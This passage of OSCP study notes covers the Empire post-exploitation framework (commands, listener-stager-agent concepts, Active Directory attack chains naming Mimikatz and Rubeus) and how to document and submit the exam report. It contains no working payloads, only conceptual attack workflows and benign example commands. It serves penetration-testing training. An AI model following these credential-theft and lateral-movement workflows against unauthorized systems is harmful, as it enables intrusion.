|Listeners|Yes|Yes|
|AD tooling|Strong|Strong|
|PowerShell integration|Strong|Available|
|Metasploit integration|No/limited|Native|
|GUI|Starkiller|Metasploit GUIs/interfaces|

For OSCP, you should understand **both the framework concepts and the underlying manual techniques**.

---

## 15. Important Empire Commands

The exact syntax depends on the Empire version, but the important command categories are:

```
help
listeners
uselistener
agents
interact
usemodule
searchmodule
usestager
useplugin
info
set
execute
back
kill
```

The classic Empire workflow is heavily based around menus and commands such as `uselistener`, `usestager`, `agents`, `interact`, and `usemodule`.

---

## 16. Typical Post-Exploitation Workflow

```
1. Initial Access
       ↓
2. Establish Agent
       ↓
3. Situational Awareness
       ↓
4. Enumerate User/System
       ↓
5. Enumerate Network
       ↓
6. Enumerate AD
       ↓
7. Identify Credentials
       ↓
8. Privilege Escalation
       ↓
9. Credential / Token / Ticket Access
       ↓
10. Lateral Movement
       ↓
11. Additional Enumeration
       ↓
12. Objective
```

The key OSCP mindset is:

> **Don't use Empire blindly. Use it to automate or organize techniques you already understand.**

---

## 17. Empire in Active Directory

For an AD environment, a useful conceptual chain is:

```
Initial Foothold
      ↓
Empire Agent
      ↓
Host Enumeration
      ↓
Domain Enumeration
      ↓
Users / Groups / Computers
      ↓
ACL / Delegation / Trust Analysis
      ↓
Credential or Ticket Opportunity
      ↓
Privilege Escalation
      ↓
Lateral Movement
      ↓
Domain Admin / Objective
```

Empire is particularly useful here because its ecosystem historically includes tools such as **PowerView, Mimikatz, Rubeus, Certify and other Windows/AD tooling**.

---

## 18. OSCP Exam Relevance

### Know Well

- What Empire is
- Listener vs stager vs agent
- How agents work
- How modules work
- Basic Empire navigation
- Windows post-exploitation
- PowerView concepts
- Mimikatz concepts
- AD enumeration
- Credential/ticket concepts
- Privilege escalation workflow
- File transfer
- Command execution

### Don't Waste Too Much Time On

- Memorizing every Empire module
- Memorizing every listener option
- Memorizing every PowerView command
- Advanced Empire development
- Framework internals

For OSCP, **manual enumeration and exploitation remain more important than knowing a C2 framework's entire feature set.**

---

## Quick Revision

```
Empire
│
├── Server
│
├── Client
│
├── Listener
│     └── Communication endpoint
│
├── Stager
│     └── Establishes initial agent
│
├── Agent
│     └── Post-exploitation session
│
├── Modules
│     ├── Enumeration
│     ├── PrivEsc
│     ├── Credentials
│     ├── AD
│     └── Lateral Movement
│
├── Plugins
│     └── Extend functionality
│
└── Starkiller
      └── GUI
```

**OSCP takeaway:**  
**Empire = post-exploitation/adversary-emulation framework → Listener → Stager → Agent → Modules → Enumeration → PrivEsc/Credentials/AD → Objective.**

### Sources

- Empire — BC Security
- [Empire Quickstart Documentation](https://github.com/EmpireProject/Empire/wiki/Quickstart?utm_source=chatgpt.com)

# ==Documentation and Reporting==
![[18233907.png]]
## 1. Purpose

Documentation and reporting are essential parts of the OSCP. Your report should allow a technically competent reader to **reproduce your exploitation process step-by-step**.

OffSec specifically requires documenting the attacks, commands, code/scripts, console output, screenshots, and proof of compromise.

---

## 2. Documentation During the Exam

Do **not** wait until the end of the exam to start writing.

For every target, record:

- Target IP / hostname
- Open ports and services
- Enumeration results
- Vulnerabilities discovered
- Initial access technique
- Credentials discovered
- Exploitation commands
- Privilege escalation technique
- Commands used
- Important console output
- Screenshots
- `local.txt`
- `proof.txt`
- Any scripts or exploits used
- Any modifications made to public exploits

A good workflow is:

```
Enumeration
    ↓
Finding
    ↓
Exploitation
    ↓
Initial Access
    ↓
Enumeration as new user
    ↓
Privilege Escalation
    ↓
Root / Administrator
    ↓
Proof
    ↓
Report
```

OffSec recommends treating the exam like a real penetration test and documenting important information as you work.

---

## 3. Report Structure

A clean OSCP report can follow this structure:

```
1. Introduction
2. Executive Summary
3. Methodology
4. Scope
5. Target 1
   5.1 Enumeration
   5.2 Initial Access
   5.3 Privilege Escalation
   5.4 Proof
6. Target 2
   6.1 Enumeration
   6.2 Initial Access
   6.3 Privilege Escalation
   6.4 Proof
7. Active Directory
   7.1 Enumeration
   7.2 Initial Compromise
   7.3 Lateral Movement
   7.4 Privilege Escalation
   7.5 Domain Controller
   7.6 Proof
8. Conclusion
```

For each machine, keep the attack chain chronological.

---

## 4. Enumeration

Document the important results rather than dumping every command you ever executed.

### Example

```
nmap -sC -sV -p- 192.168.1.10
```

Then document the relevant result:

```
22/tcp   open  ssh
80/tcp   open  http
445/tcp  open  microsoft-ds
```

Explain what you investigated:

```
Port 80 exposed a web application running version X.X.
Further enumeration revealed an authenticated administrative panel.
```

The goal is to make the reasoning behind the attack understandable.

---

## 5. Initial Access

Document the vulnerability and exploitation process.

### Example

```
The web application was vulnerable to authenticated file upload.

1. Authenticate using the discovered credentials.
2. Navigate to the upload functionality.
3. Upload the malicious file.
4. Trigger the uploaded file.
5. Obtain a reverse shell.
```

Include:

- Request/command
- Payload
- Relevant response
- Screenshot
- Resulting shell

---

## 6. Privilege Escalation

Clearly explain:

```
Current User
     ↓
Enumeration
     ↓
Misconfiguration / Vulnerability
     ↓
Exploit
     ↓
Root / Administrator
```

For example:

```
whoami
sudo -l
```

Then explain why the discovered configuration allowed privilege escalation.

Avoid simply writing:

```
Ran exploit → got root.
```

Instead, explain **why the exploit worked**.

---

## 7. Active Directory Reporting

For AD, document the attack path clearly:

```
Initial User
     ↓
Domain Enumeration
     ↓
Credential / Access Discovery
     ↓
Lateral Movement
     ↓
Privilege Escalation
     ↓
Domain Admin
     ↓
DC Proof
```

Useful information to document includes:

- Domain name
- Domain Controller
- Domain users
- Groups
- Shares
- SPNs
- Kerberos-related findings
- Credentials/hashes obtained
- ACL/permission abuse
- Lateral movement
- Privilege escalation
- Domain Administrator compromise

Don't dump every BloodHound relationship into the report. Show the **relationships that actually contributed to your attack path**.

---

## 8. Exploit Code

If you use a public exploit **without modifying it**, OffSec says you should provide the URL to the original exploit rather than reproducing the entire code.

If you modify the exploit, document:

```
Original exploit:
<URL>

Modifications:
- Changed target IP
- Changed target port
- Modified payload

Reason:
The original exploit targeted a different configuration.
```

You should include the modified code in the report.

---

## 9. Proof Screenshots

Proof is extremely important.

For each target, capture the proof from an **interactive shell** using the original proof-file location.

### Linux

```
cat /path/to/local.txt
cat /path/to/proof.txt
```

### Windows

```
type C:\path\to\local.txt
type C:\path\to\proof.txt
```

OffSec requires the appropriate proof files to be submitted and documented with screenshots; obtaining them through an alternative method such as a web shell can result in zero points for that target.

---

## 10. Screenshots

Screenshots should prove important steps, not just decorate the report.

Good screenshots include:

- Vulnerability discovery
- Successful exploitation
- Obtained shell
- Privilege escalation
- `whoami`
- Root/Admin access
- `local.txt`
- `proof.txt`
- Important AD attack steps

Make sure the screenshot clearly shows:

```
Command
+
Target
+
Result
```

---

## 11. Reproducibility

A good report should allow another pentester to reproduce your attack.

Bad:

```
Used an exploit to get root.
```

Good:

```
The service was vulnerable to X.

Run:

$ python3 exploit.py 192.168.1.10 4444

The exploit triggered the vulnerable function and connected back to the listener.

The resulting shell was running as www-data.
```

The report should contain enough detail for the grader to follow your attack step-by-step.

---

## 12. Report Quality Checklist

Before submitting:

```
[ ] Every compromised machine documented
[ ] Enumeration documented
[ ] Initial access documented
[ ] Privilege escalation documented
[ ] AD attack path documented
[ ] Commands included
[ ] Important output included
[ ] Screenshots included
[ ] local.txt documented
[ ] proof.txt documented
[ ] Exploit sources included
[ ] Modified exploits explained
[ ] Report proofread
[ ] PDF opens correctly
[ ] No missing screenshots
[ ] No formatting problems
```

**Important:** OffSec considers the submitted report final. Missing screenshots or information cannot simply be added afterward.

---

## 13. Submission

For the current OSCP+ process, the report must be submitted as a **PDF inside a `.7z` archive**. The archive must not be password protected and must follow the required filename format. OffSec currently specifies submission within **24 hours** after the exam.

Example:

```
7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
```

Then verify the MD5 hash of the uploaded archive against your local copy.

---

## 14. Golden Rule

> **If the grader cannot reproduce your attack from your report, your documentation is incomplete.**

For OSCP, **getting the shell is only half the job — proving and documenting exactly how you got it is part of the exam.**